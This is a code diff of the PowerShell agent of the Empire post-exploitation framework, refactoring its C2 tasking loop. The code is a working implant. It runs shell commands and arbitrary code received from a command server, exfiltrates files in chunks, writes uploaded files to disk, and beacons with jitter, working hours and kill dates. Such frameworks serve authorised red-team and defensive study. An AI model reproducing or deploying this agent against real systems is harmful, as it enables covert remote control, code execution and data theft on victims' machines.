                 $msg = "[!] Agent "+$script:SessionID+" exiting"
                 # this is the only time we send a message out of the normal process,
                 #   because we're exited immediately after
-                Send-Message $(Encode-Packet -type $type -data $msg)
+                Send-Message -Packets $(Encode-Packet -type $type -data $msg -ResultID $ResultID)
                 exit
             }
             # shell command
-            elseif($type -eq 40){
+            elseif($type -eq 40) {
                 $parts = $data.Split(" ")
-
                 # if the command has no arguments
-                if($parts.Length -eq 1){
+                if($parts.Length -eq 1) {
                     $cmd = $parts[0]
-                    Encode-Packet -type $type -data $((Invoke-ShellCommand -cmd $cmd) -join "`n").trim()
+                    Encode-Packet -type $type -data $((Invoke-ShellCommand -cmd $cmd) -join "`n").trim() -ResultID $ResultID
                 }
                 # if the command has arguments
                 else{
                     $cmd = $parts[0]
                     $cmdargs = $parts[1..$parts.length] -join " "
-                    Encode-Packet -type $type -data $((Invoke-ShellCommand -cmd $cmd -cmdargs $cmdargs) -join "`n").trim()
+                    Encode-Packet -type $type -data $((Invoke-ShellCommand -cmd $cmd -cmdargs $cmdargs) -join "`n").trim() -ResultID $ResultID
                 }
             }
             # file download
-            elseif($type -eq 41){
+            elseif($type -eq 41) {
                 try {
                     $ChunkSize = 512KB
-                    
+
                     $Parts = $Data.Split(" ")
 
                     if($Parts.Length -gt 1) {
@@ -692,6 +817,8 @@ function Invoke-Empire {
                         $Path = $Data
                     }
 
+                    $Path = $Path.Trim('"').Trim("'")
+
                     # hardcoded floor/ceiling limits
                     if($ChunkSize -lt 64KB) {
                         $ChunkSize = 64KB
@@ -701,24 +828,24 @@ function Invoke-Empire {
                     }
 
                     # resolve the complete path
-                    $Path = Get-Childitem $Path | %{$_.FullName}
+                    $Path = Get-Childitem $Path | ForEach-Object {$_.FullName}
 
                     # read in and send the specified chunk size back for as long as the file has more parts
                     $Index = 0
                     do{
                         $EncodedPart = Get-FilePart -File "$path" -Index $Index -ChunkSize $ChunkSize
-                        
-                        if($EncodedPart){
+
+                        if($EncodedPart) {
                             $data = "{0}|{1}|{2}" -f $Index, $path, $EncodedPart
-                            Send-Message (Encode-Packet -type $type -data $($data))
+                            Send-Message -Packets $(Encode-Packet -type $type -data $($data) -ResultID $ResultID)
                             $Index += 1
-                            
+
                             # if there are more parts of the file, sleep for the specified interval
-                            if ($script:AgentDelay -ne 0){
+                            if ($script:AgentDelay -ne 0) {
                                 $min = [int]((1-$script:AgentJitter)*$script:AgentDelay)
                                 $max = [int]((1+$script:AgentJitter)*$script:AgentDelay)
 
-                                if ($min -eq $max){
+                                if ($min -eq $max) {
                                     $sleepTime = $min
                                 }
                                 else{
@@ -730,405 +857,282 @@ function Invoke-Empire {
                         [GC]::Collect()
                     } while($EncodedPart)
 
-                    Encode-Packet -type 40 -data "[*] File download of $path completed"
+                    Encode-Packet -type 40 -data "[*] File download of $path completed" -ResultID $ResultID
                 }
                 catch {
-                    Encode-Packet -type 0 -data "file does not exist or cannot be accessed"
+                    Encode-Packet -type 0 -data '[!] File does not exist or cannot be accessed' -ResultID $ResultID
                 }
             }
             # file upload
-            elseif($type -eq 42){
-                $parts = $data.split("|")
+            elseif($type -eq 42) {
+                $parts = $data.split('|')
                 $filename = $parts[0]
                 $base64part = $parts[1]
                 # get the raw file contents and save it to the specified location
                 $Content = [System.Convert]::FromBase64String($base64part)
                 try{
                     Set-Content -Path $filename -Value $Content -Encoding Byte
-                    Encode-Packet -type $type -data "[*] Upload of $fileName successful"
+                    Encode-Packet -type $type -data "[*] Upload of $fileName successful" -ResultID $ResultID
                 }
                 catch {
-                    Encode-Packet -type 0 -data "[!] Error in writing file during upload"
+                    Encode-Packet -type 0 -data '[!] Error in writing file during upload' -ResultID $ResultID
                 }
             }
 
             # return the currently running jobs
-            elseif($type -eq 50){
-               Encode-Packet -data ((Get-Job -name ($JobNameBase + "*") | % {$_.name}) -join "`n") -type $type
+            elseif($type -eq 50) {
+                $RunningJobs = $Script:Jobs.Keys -join "`n"
+                Encode-Packet -data ("Running Jobs:`n$RunningJobs") -type $type -ResultID $ResultID
             }
+
             # stop and remove a specific job if it's running
-            elseif($type -eq 51){
-                $job = Get-Job -name $data
-                $jobName = $data
-                # send result data if there is any
-                try{
-                    # $data = Receive-Job -name $job | Select-Object -Property * -ExcludeProperty RunspaceID | fl | Out-String
-                    $data = Receive-Job -name $job
+            elseif($type -eq 51) {
+                $JobName = $data
+                $JobResultID = $ResultIDs[$JobName]
 
-                    if ($data -is [system.array]){
-                        $data = $data -join ""
+                try {
+                    $Results = Stop-AgentJob -JobName $JobName | fl | Out-String
+                    # send result data if there is any
+                    if($Results -and $($Results.trim() -ne '')) {
+                        Encode-Packet -type $type -data $($Results) -ResultID $JobResultID
                     }
-                    $data = $data | fl | Out-String
-
-                    if($data -and $($data.trim() -ne '')) {
-                        Encode-Packet -type $type -data $($data)
-                    }
-                    Stop-Job $job
-                    Remove-Job $job
-                    Encode-Packet -type 51 -data "Job $jobName killed."
+                    Encode-Packet -type 51 -data "Job $JobName killed." -ResultID $JobResultID
                 }
                 catch {
-                    Encode-Packet -type 0 -data "error in stopping job"
+                    Encode-Packet -type 0 -data "[!] Error in stopping job: $JobName" -ResultID $JobResultID
                 }
             }
 
             # dynamic code execution, wait for output, don't save output
-            elseif($type -eq 100){
-                # # original method:
-                # # $null = IEX $data
-                Encode-Packet -type $type -data (IEX $data)
-
-                # $ps = [PowerShell]::Create()
-                # # $runspace = [runspacefactory]::CreateRunspace()
-                # # $runspace.open()
-                # # $ps.runspace = $runspace
-                # $null = $ps.AddScript( [scriptblock]::Create($data) )
-                # $output = $ps.invoke() | out-string
-
-                # # cleanup
-                # # $ps.runspace.Dispose()
-                # # $ps.stop()
-                # $null = $ps.Dispose()
-                # $ps = $null
-                # $null = Remove-Variable ps;
-
-                # # send back the results
-                # Encode-Packet -type $type -data $output;
-                # $null = Remove-Variable output;
-                # [GC]::Collect()
+            elseif($type -eq 100) {
+                $ResultData = IEX $data
+                if($ResultData) {
+                    Encode-Packet -type $type -data $ResultData -ResultID $ResultID
+                }
             }
             # dynamic code execution, wait for output, save output
-            elseif($type -eq 101){
-
+            elseif($type -eq 101) {
                 # format- [15 chars of prefix][5 chars extension][data]
                 $prefix = $data.Substring(0,15)
                 $extension = $data.Substring(15,5)
                 $data = $data.Substring(20)
-
-                # $ps = [PowerShell]::Create()
-                # $runspace = [runspacefactory]::CreateRunspace()
-                # $runspace.open()
-                # $ps.runspace = $runspace
-                # $null = $ps.AddScript( [scriptblock]::Create($data) )
-                # $output = $ps.invoke() | out-string
-
-                # # cleanup
-                # $ps.runspace.Dispose()
-                # $ps = $null
 
                 # send back the results
-                Encode-Packet -type $type -data ($prefix + $extension + (IEX $data))
+                Encode-Packet -type $type -data ($prefix + $extension + (IEX $data)) -ResultID $ResultID
             }
             # dynamic code execution, no wait, don't save output
-            elseif($type -eq 110){
+            elseif($type -eq 110) {
                 $jobID = Start-AgentJob $data
-                Encode-Packet -type $type -data ("Job started: " + $jobID)
+                $script:ResultIDs[$jobID]=$resultID
+                Encode-Packet -type $type -data ("Job started: " + $jobID) -ResultID $ResultID
             }
             # dynamic code execution, no wait, save output
-            elseif($type -eq 111){
-                # format- [15 chars of prefix][5 chars extension][data]
-                $prefix = $data.Substring(0,15)
-                $extension = $data.Substring(15,5)
-                $data = $data.Substring(20)
+            elseif($type -eq 111) {
+                # Write-Host "'dynamic code execution, no wait, save output' not implemented!"
 
-                $jobID = Start-AgentJob $data $prefix $extension
-                Encode-Packet -type 110 -data ("Job started: " + $jobID)
+                # format- [15 chars of prefix][5 chars extension][data]
+                # $prefix = $data.Substring(0,15)
+                # $extension = $data.Substring(15,5)
+                # $data = $data.Substring(20)
+                # $jobID = Start-AgentJob $data $prefix $extension
+                # $script:resultIDs[$jobID] = $resultID
+                # Encode-Packet -type 110 -data ("Job started: " + $jobID)
             }
 
             # import a dynamic script and save it in agent memory
-            elseif($type -eq 120){
+            elseif($type -eq 120) {
                 # encrypt the script for storage
-                $script:importedScript = Encrypt-Bytes $encoding.getbytes($data);
-                Encode-Packet -type $type -data "script successfully saved in memory"
+                $script:ImportedScript = Encrypt-Bytes $Encoding.GetBytes($data);
+                Encode-Packet -type $type -data "script successfully saved in memory" -ResultID $ResultID
             }
+
             # execute a function in the currently imported script
-            elseif($type -eq 121){
-                
+            elseif($type -eq 121) {
                 # decrypt the script in memory and execute the code as a background job
-                $script = Decrypt-Bytes $script:importedScript
-                if ($script){
+                $script = Decrypt-Bytes $script:ImportedScript
+                if ($script) {
                     $jobID = Start-AgentJob ([System.Text.Encoding]::UTF8.GetString($script) + "; $data")
-                    Encode-Packet -type $type -data ("Job started: " + $jobID)
+                    $script:ResultIDs[$jobID]=$ResultID
+                    Encode-Packet -type $type -data ("Job started: " + $jobID) -ResultID $ResultID
                 }
             }
 
             else{
-                Encode-Packet -type 0 -data "invalid type: $type"
+                Encode-Packet -type 0 -data "invalid type: $type" -ResultID $ResultID
             }
         }
         catch [System.Exception] {
-            Encode-Packet -type $type -data "error running command: $_"
+            Encode-Packet -type $type -data "error running command: $_" -ResultID $ResultID
         }
     }
 
-    # process a fetched tasking from the C2 server
-    function Process-Tasking {
-        param($tasking)
+    # process tasking packets from the server
+    function Process-TaskingPackets {
+        param($Tasking)
 
         # Decrypt the tasking and process it appropriately
-        $taskingBytes = Decrypt-Bytes $tasking
-        if (!$taskingBytes){
+        $TaskingBytes = Decrypt-Bytes $Tasking
+        if (-not $TaskingBytes) {
             return
         }
 
         # decode the first packet
-        $decoded = Decode-Packet $taskingBytes
+        $Decoded = Decode-Packet $TaskingBytes
+        $Type = $Decoded[0]
+        $TotalPackets = $Decoded[1]
+        $PacketNum = $Decoded[2]
+        $TaskID = $Decoded[3]
+        $Length = $Decoded[4]
+        $Data = $Decoded[5]
 
-        $type = $decoded[0]
-        $counter = $decoded[1]
-        $length = $decoded[2]
-        $data = $decoded[3]
+        # TODO: logic to handle taskings that span multiple packets
 
         # any remaining sections of the packet
-        $remaining = $decoded[4]
-
-        # calculate what the server's epoch should be based on the epoch diff
-        #   this is just done for the first packet in a queue
-        $ServerEpoch = [int][double]::Parse((Get-Date(Get-Date).ToUniversalTime()-UFormat %s)) - $script:EpochDiff
-
-        # if the epoch counter isn't within a +/- 12 hour range (43200 seconds)
-        #   skip processing this packet
-        if ($counter -lt ($ServerEpoch-43200) -or $counter -gt ($ServerEpoch+43200)){
-            return
-        }
+        $Remaining = $Decoded[6]
 
         # process the first part of the packet
-        $resultPackets = $(Process-Packet $type $data)
+        $ResultPackets = $(Process-Tasking $Type $Data $TaskID)
 
-        $offset = 12 + $length
+        $Offset = 12 + $Length
         # process any additional packets in the tasking
-        while($remaining.Length -ne 0){
-            $decoded = Decode-Packet $taskingBytes $offset
-            $type = $decoded[0]
-            $counter = $decoded[1]
-            $length = $decoded[2]
-            $data = $decoded[3]
-            $remaining = $decoded[4]
-
+        while($Remaining.Length -ne 0) {
+            $Decoded = Decode-Packet $TaskingBytes $Offset
+            $Type = $Decoded[0]
+            $TotalPackets = $Decoded[1]
+            $PacketNum = $Decoded[2]
+            $TaskID = $Decoded[3]
+            $Length = $Decoded[4]
+            $Data = $Decoded[5]
+            if ($Decoded.Count -eq 7) {$Remaining = $Decoded[6]}
             # process the new sub-packet and add it to the result set
-            $resultPackets += $(Process-Packet $type $data)
+            $ResultPackets += $(Process-Tasking $Type $Data $TaskID)
 
-            $offset += $(12 + $length)
+            $Offset += $(12 + $Length)
         }
 
         # send all the result packets back to the C2 server
-        Send-Message $resultPackets
+        Send-Message -Packets $ResultPackets
     }
 
-    # get a task from the c2 server
-    function Get-Task {
-        try{
-
-            if ($Servers[$ServerIndex].StartsWith("http")){
-                # build the web request object
-                $wc = new-object system.net.WebClient
-                # set the proxy settings for the WC to be the default system settings
-                $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
-                $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
-                $wc.Headers.Add("User-Agent",$script:UserAgent)
-                $wc.Headers.Add("Cookie",$script:Cookie)
-                $script:Headers.GetEnumerator() | % {$wc.Headers.Add($_.Name, $_.Value)}
-
-                # choose a random valid URI for checkin
-                $taskURI = $script:TaskURIs | Get-Random
-                $result = $wc.DownloadData($Servers[$ServerIndex] + $taskURI)
-                $result
-            }
-        }
-        catch [Net.WebException] {
-            $script:MissedCheckins+=1
-
-            # handle host not found/reachable?
-            # if($_.Exception -match "(403)"){
-            #     Write-Host "403!!"
-            # }
-        }
-    }
 
     ############################################################
-    # Execute main functionality
+    #
+    # Main agent loop
+    #
     ############################################################
 
-    while ($True){
+    while ($True) {
 
-        # check the kill date if one is specified
-        if(($script:KillDate) -and ((Get-Date) -gt $script:KillDate)) {
-            
+        # check the kill date and lost limit, exiting and returning job output if either are past
+        if ( (($script:KillDate) -and ((Get-Date) -gt $script:KillDate)) -or ((!($script:LostLimit -eq 0)) -and ($script:MissedCheckins -gt $script:LostLimit)) ) {
+
+            $Packets = $null
+
             # get any job results and kill the jobs
-            $packets = $null
-            Get-Job -name ($JobNameBase + "*") | %{
-                # $data = Receive-Job $_ | Select-Object -Property * -ExcludeProperty RunspaceID | fl | Out-String
-                # $data = Receive-Job $_ | fl | Out-String
-                $data = Receive-Job $_
-
-                if ($data -is [system.array]){
-                    $data = $data -join ""
-                }
-                $data = $data | fl | Out-String
-
-                if($data){
-                    $packets += $(Encode-Packet -type 110 -data $($data))
-                }
-                Stop-Job $_
-                Remove-Job $_
+            ForEach($JobName in $Script:Jobs.Keys) {
+                $Results = Stop-AgentJob -JobName $JobName | fl | Out-String
+                $JobResultID = $script:ResultIDs[$JobName]
+                $Packets += $(Encode-Packet -type 110 -data $($Results) -ResultID $JobResultID)
+                $script:ResultIDs.Remove($JobName)
             }
+
             # send job results back if there are any
-            if ($packets){
-                Send-Message $packets
+            if ($Packets) {
+                Send-Message -Packets $Packets
             }
 
-            # send an exit status message and die
-            # $msg = "[!] Agent "+$script:SessionID+" exiting: past killdate"
-            $msg = "[!] Agent "+$script:SessionID+" exiting: past killdate"
-            Send-Message $(Encode-Packet -type 2 -data $msg)
-
-            exit
-        }
-        if((!($script:LostLimit -eq 0)) -and ($script:MissedCheckins -gt $script:LostLimit))
-        {
-
-            # get any job results and kill the jobs
-            $packets = $null
-            Get-Job -name ($JobNameBase + "*") | %{
-                # $data = Receive-Job $_ | Select-Object -Property * -ExcludeProperty RunspaceID | fl | Out-String
-                # $data = Receive-Job $_ | fl | Out-String
-                $data = Receive-Job $_
-
-                if ($data -is [system.array]){
-                    $data = $data -join ""
-                }
-                $data = $data | fl | Out-String
-
-                if($data){
-                    $packets += $(Encode-Packet -type 110 -data $($data))
-                }
-                Stop-Job $_
-                Remove-Job $_
+            # send an exit status message and exit
+            if (($script:KillDate) -and ((Get-Date) -gt $script:KillDate)) {
+                $msg = "[!] Agent "+$script:SessionID+" exiting: past killdate"
             }
-
-            # send an exit status message and die
-            $msg = "[!] Agent "+$script:SessionID+" exiting: Lost limit reached"
-            Send-Message $(Encode-Packet -type 2 -data $msg)
-
+            else {
+                $msg = "[!] Agent "+$script:SessionID+" exiting: Lost limit reached"
+            }
+            Send-Message -Packets $(Encode-Packet -type 2 -data $msg)
             exit
         }
 
-        if($Servers[$ServerIndex].StartsWith("http")){
+        # if there are working hours set, make sure we're operating within the given time span
+        #   format is "8:00-17:00"
+        if ($script:WorkingHours -match '^[0-9]{1,2}:[0-5][0-9]-[0-9]{1,2}:[0-5][0-9]$') {
 
-            # if there are working hours set, make sure we're operating within the given time span
-            #   format is "8:00-17:00"
-            if ($script:WorkingHours -match '^[0-9]{1,2}:[0-5][0-9]-[0-9]{1,2}:[0-5][0-9]$'){
-                
-                $current = Get-Date
-                $start = Get-Date ($script:WorkingHours.split("-")[0])
-                $end = Get-Date ($script:WorkingHours.split("-")[1])
+            $current = Get-Date
+            $start = Get-Date ($script:WorkingHours.split("-")[0])
+            $end = Get-Date ($script:WorkingHours.split("-")[1])
 
-                # correct for hours that span overnight
-                if (($end-$start).hours -lt 0) {
-                    $start = $start.AddDays(-1)
-                }
-
-                # if the current time is past the start time
-                $startCheck = $current -ge $start
-
-                # if the current time is less than the end time
-                $endCheck = $current -le $end
-
-                # if the current time falls outside the window
-                if ((-not $startCheck) -or (-not $endCheck)) {
-
-                    # sleep until the operational window starts again
-                    $sleepSeconds = ($start - $current).TotalSeconds
-
-                    if($sleepSeconds -lt 0) {
-                        # correct for hours that span overnight
-                        $sleepSeconds = ($start.addDays(1) - $current).TotalSeconds
-                    }
-                    Start-Sleep -s $sleepSeconds
-                }
+            # correct for hours that span overnight
+            if (($end-$start).hours -lt 0) {
+                $start = $start.AddDays(-1)
             }
 
-            # if there's a delay (i.e. no interactive/delay 0) then
-            # sleep for the specified time
-            if ($script:AgentDelay -ne 0){
-                $min = [int]((1-$script:AgentJitter)*$script:AgentDelay)
-                $max = [int]((1+$script:AgentJitter)*$script:AgentDelay)
+            # if the current time is past the start time
+            $startCheck = $current -ge $start
 
-                if ($min -eq $max){
-                    $sleepTime = $min
+            # if the current time is less than the end time
+            $endCheck = $current -le $end
+
+            # if the current time falls outside the window
+            if ((-not $startCheck) -or (-not $endCheck)) {
+
+                # sleep until the operational window starts again
+                $sleepSeconds = ($start - $current).TotalSeconds
+
+                if($sleepSeconds -lt 0) {
+                    # correct for hours that span overnight
+                    $sleepSeconds = ($start.addDays(1) - $current).TotalSeconds
                 }
-                else{
-                    $sleepTime = Get-Random -minimum $min -maximum $max;
-                }
-                Start-Sleep -s $sleepTime;
+                # sleep until the wake up interval
+                Start-Sleep -Seconds $sleepSeconds
             }
-
-            # poll running jobs, receive any data, and remove any completed jobs
-            Get-Job -name ($JobNameBase + "*") | %{
-                if($_.HasMoreData){
-                    # make sure we don't return the RunspaceId field
-                    # $data = Receive-Job $_ | Select-Object -Property * -ExcludeProperty RunspaceID | fl | Out-String
-                    # $data = Receive-Job $_ | fl | Out-String
-                    $data = Receive-Job $_
-
-                    if ($data -is [system.array]){
-                        $data = $data -join ""
-                    }
-                    $data = $data | fl | Out-String
-
-
-                    if($data){
-                        $encoded = Encode-Packet -type 110 -data $($data)
-                        Send-Message $encoded
-                    }
-                }
-                if($_.State -eq "Completed"){
-                    Remove-Job $_
-                }
-            }
-
-            # get the next task from the server
-            $data = Get-Task
-
-            #Check to see if we got data
-            if ($data) {
-                #did we get a default page
-                if ([System.Text.Encoding]::UTF8.GetString($data) -eq $script:DefaultPage) {
-                    $script:MissedCheckins=0
-                }
-                #we did not get a default, check for erros and process the tasking
-                elseif (-not ([System.Text.Encoding]::UTF8.GetString($data) -eq $script:DefaultPage)) {
-                    # check if an error was received
-                    if ($data.GetType().Name -eq "ErrorRecord"){
-                        $statusCode = [int]$_.Exception.Response.StatusCode
-                        if ($statusCode -eq 0){
-
-                        }
-                    }
-                    else {
-                        # if we get data with no error, process the packet
-                        $script:MissedCheckins=0
-                        Process-Tasking $data
-                    }
-
-                }
-                else {
-                    #No data... wierd?
-                
-                }
-            }
-            # force garbage collection to clean up :)
-            [GC]::Collect()
         }
+
+        # if there's a delay (i.e. no interactive/delay 0) then sleep for the specified time
+        if ($script:AgentDelay -ne 0) {
+            $SleepMin = [int]((1-$script:AgentJitter)*$script:AgentDelay)
+            $SleepMax = [int]((1+$script:AgentJitter)*$script:AgentDelay)
+
+            if ($SleepMin -eq $SleepMax) {
+                $SleepTime = $SleepMin
+            }
+            else{
+                $SleepTime = Get-Random -Minimum $SleepMin -Maximum $SleepMax
+            }
+            Start-Sleep -Seconds $sleepTime;
+        }
+
+        # poll running jobs, receive any data, and remove any completed jobs
+        $JobResults = $Null
+        ForEach($JobName in $Script:Jobs.Keys) {
+            $JobResultID = $script:ResultIDs[$JobName]
+            # check if the job is still running
+            if(Get-AgentJobCompleted -JobName $JobName) {
+                # the job has stopped, so receive results/cleanup
+                $Results = Stop-AgentJob -JobName $JobName | fl | Out-String
+            }
+            else {
+                $Results = Receive-AgentJob -JobName $JobName | fl | Out-String
+            }
+
+            if($Results) {
+                $JobResults += $(Encode-Packet -type 110 -data $($Results) -ResultID $JobResultID)
+            }
+        }
+
+        if ($JobResults) {
+            Send-Message -Packets $JobResults
+        }
+
+        # get the next task from the server
+        $TaskData = Get-Task
+        if ($TaskData) {
+            $script:MissedCheckins = 0
+            # did we get not get the default response
+            if ([System.Text.Encoding]::UTF8.GetString($TaskData) -ne $script:DefaultResponse) {
+                Decode-RoutingPacket -PacketData $TaskData
+            }
+        }
+
+        # force garbage collection to clean up :)
+        [GC]::Collect()
     }
 }
